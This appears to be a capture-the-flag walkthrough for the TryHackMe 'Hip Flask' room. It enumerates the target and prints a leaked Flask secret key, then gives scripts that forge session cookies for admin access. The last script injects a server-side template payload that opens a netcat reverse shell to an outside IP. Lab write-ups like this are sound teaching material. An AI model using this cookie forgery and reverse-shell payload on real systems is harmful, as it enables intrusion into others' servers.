# Hip Flask

**Room Link:** [https://tryhackme.com/r/room/hipflask](https://tryhackme.com/r/room/hipflask)

## **Scans** <a href="#scans" id="scans"></a>

Initial scan

**Kali**

```
nmap -A $VICTIM
```

<figure><img src="../../.gitbook/assets/image (906).png" alt=""><figcaption></figcaption></figure>

Longer scan

**Kali**

```
nmap -sV -sT -O -p 1-65535 $VICTIM
```

<figure><img src="../../.gitbook/assets/image (907).png" alt=""><figcaption></figcaption></figure>

## **UDP/53 - DNS**

<figure><img src="../../.gitbook/assets/image (908).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
echo "$VICTIM hipflasks.thm" >> /etc/hosts
```

**Kali**

```
dig -t AXFR hipflasks.thm @$VICTIM
```

<figure><img src="../../.gitbook/assets/image (909).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
echo "$VICTIM hipflasks.thm hipper.hipflasks.thm" >> /etc/hosts
```

## **TCP/80:443 - HTTP(s)**

**Kali**

```
gobuster  dir -u https://hipper.hipflasks.thm -k -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt
```

<figure><img src="../../.gitbook/assets/image (912).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/image (910).png" alt=""><figcaption></figcaption></figure>





**Kali**

```
gobuster  dir -u https://hipper.hipflasks.thm -k -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x py  
```

<figure><img src="../../.gitbook/assets/image (913).png" alt=""><figcaption></figcaption></figure>

**main.py**

There is a secret key in this file&#x20;

```
#!/usr/bin/python3
from flask import Flask, redirect, render_template, request, session
from datetime import datetime
from waitress import serve
from modules import abp
from libs.db import AuthConn, StatsConn

app = Flask(__name__)
app.template_folder="views"
app.config["SECRET_KEY"] = "43961b349373988c271babcbb6e55347"


@app.before_request
def befReq():
	conn = StatsConn()
	if not session.get("visited"):
		conn.addView("uniqueViews")
		session["visited"] = "True"
	conn.addView("totalViews")


@app.route("/")
def home():
	return render_template("index.html", year=datetime.now().date().strftime("%Y")), 200

app.register_blueprint(abp, url_prefix="/admin")


@app.errorhandler(403)
def error403(e):
	return "You are not authorised to access this", 403


#Confirm that there is an admin account in place
AuthConn()

serve(app, host="127.0.0.1", port=8000)

```





**Kali(poc-venv)**

```
sudo apt update && sudo apt install python3-venv
python3 -m venv poc-venv
source poc-venv/bin/activate
```

**Kali(poc-venv)**

```
pip3 install flask requests waitress
subl poc.py
```



**poc.py**

```
#!/usr/bin/env python3
from flask import Flask, session, request
from waitress import serve
import requests, threading, time

#Flask Initialisation
app = Flask(__name__)
app.config["SECRET_KEY"] = "43961b349373988c271babcbb6e55347"

@app.route("/")
def main():
    session["auth"] = "True"
    session["username"] = "Pentester"
    return "Check your cookies", 200

#Flask setup/start
thread = threading.Thread(target = lambda: serve(app, port=9000, host="127.0.0.1"))
thread.setDaemon(True)
thread.start()

#Request
time.sleep(1)
print(requests.get("http://localhost:9000/").cookies.get("session"))
```

**Kali(poc-venv)**

```
python poc.py 
```

<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

Copy the token to firefox and then we can login

<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

**Kali(poc-venv)**

```
subl poc2.py
```

Changing the code to see if it will evaluate 7\*6 in the username field

**poc2.py**

```
#!/usr/bin/python3
from flask import Flask, session, request
from waitress import serve
import requests, threading, time

#Flask Initialisation
app = Flask(__name__)
app.config["SECRET_KEY"] = "43961b349373988c271babcbb6e55347"

@app.route("/")
def main():
    session["auth"] = "True"
    session["username"] = "{{7*6}}"
    return "Check your cookies", 200

#Flask setup/start
thread = threading.Thread(target = lambda: serve(app, port=9000, host="127.0.0.1"))
thread.setDaemon(True)
thread.start()

#Request
time.sleep(1)
print(requests.get("http://localhost:9000/").cookies.get("session"))
```

**Kali(poc-venv)**

```
python poc2.py
```

Do the same steps as before to use the cookie and you can see the username is now 42

<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

**Kali(poc-venv)**

```
subl poc3.py
```

Changing the code to see if it will evaluate 7\*6 in the username field

**poc2.py**

```
#!/usr/bin/python3
from flask import Flask, session, request
from waitress import serve
import requests, threading, time

#Flask Initialisation
app = Flask(__name__)
app.config["SECRET_KEY"] = "43961b349373988c271babcbb6e55347"

@app.route("/")
def main():
    session["auth"] = "True"
    session["username"] = """{{config.__class__.__init__.__globals__['os'].popen('mkfifo /tmp/ZTQ0Y; nc 10.10.127.179 443 0</tmp/ZTQ0Y | /bin/sh >/tmp/ZTQ0Y 2>&1; rm /tmp/ZTQ0Y').read()}}"""
    return "Check your cookies", 200

#Flask setup/start
thread = threading.Thread(target = lambda: serve(app, port=9000, host="127.0.0.1"))
thread.setDaemon(True)
thread.start()

#Request
time.sleep(1)
print(requests.get("http://localhost:9000/").cookies.get("session"))
```

**Kali**

```
nc lvnp 443
```

**Kali(poc-venv)**

```
python poc3.py
```























